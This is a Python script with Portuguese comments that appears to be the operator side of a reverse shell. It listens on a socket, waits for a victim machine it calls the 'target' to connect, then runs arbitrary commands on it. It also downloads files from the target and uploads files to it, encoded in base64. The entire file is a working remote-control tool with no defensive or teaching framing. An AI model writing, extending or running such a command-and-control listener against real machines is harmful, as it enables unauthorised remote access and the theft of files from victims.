#-------------------------------------------------
# SERVER SOCKET
#-------------------------------------------------

import socket
import base64

def shell():
    current_dir = target.recv(1024)
    print("------------------------------------------------------")
    print("Entrando na função shell...")
    print("current_dir",type(current_dir))
    while True:
        #command=raw_input("{}~#: ",format(current_dir))
        print("Executando a função shell")
        command = input("{}#: ".format(current_dir))
        #command = input(format(current_dir))
        print("Comando obtido",command)
        if command == "exit":
            target.send(command.encode())
            print("Exit:",command.encode())
            break
        elif command[:2]=="cd":
            target.send(command.encode())
            res = target.recv(1024).decode().rstrip()
            current_dir=res
            print(res)
        elif command=="":
            pass
        elif command[:8]=="download": #receve um arquivo remoto: client -> server
            target.send(command.encode()) # enviar comando au client
            with open(command[9:],'wb') as file_download:
                data=target.recv(30000) # preparar buffer de recepção
                file_download.write(base64.b64decode(data))
        elif command[:6]=="upload": # envia um arquivo au client: server -> client
            try:
                target.send(command.encode()) # envio do comando au client
                with open(command[7:],'rb') as file_upload:
                    target.send(base64.b64encode(file_upload.read()))# envio arquivo au client
            except: # Se ocurrir um erro...
                print("------------------------------------------------------")
                print("Acontecio um erro no upload do arquivo")
                print("------------------------------------------------------")
        else:
            target.send(command.encode())
            res=target.recv(1024).decode().rstrip()
            if res == "1":
                continue
            else:
                print(format(res))

def serverServ():
    global server
    global ip
    global target

    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    server.bind(('10.42.0.1',7777))
    server.listen(1)
    print("------------------------------------------------------")
    print("Server type:", type(server), "->", id(server))
    print("Server:", server)
    print("Server ligado e aguardando ligações...")
    target,ip=server.accept() # aguardando Ligação
    print("------------------------------------------------------")
    print("Target type:", type(target), "->", id(target))
    print("Target:",target)
    print("Ligação recebida de:" + str(ip[0]))
    print("Saindo da função serverServ")
    print("------------------------------------------------------")

# main
serverServ()
shell()
server.close()




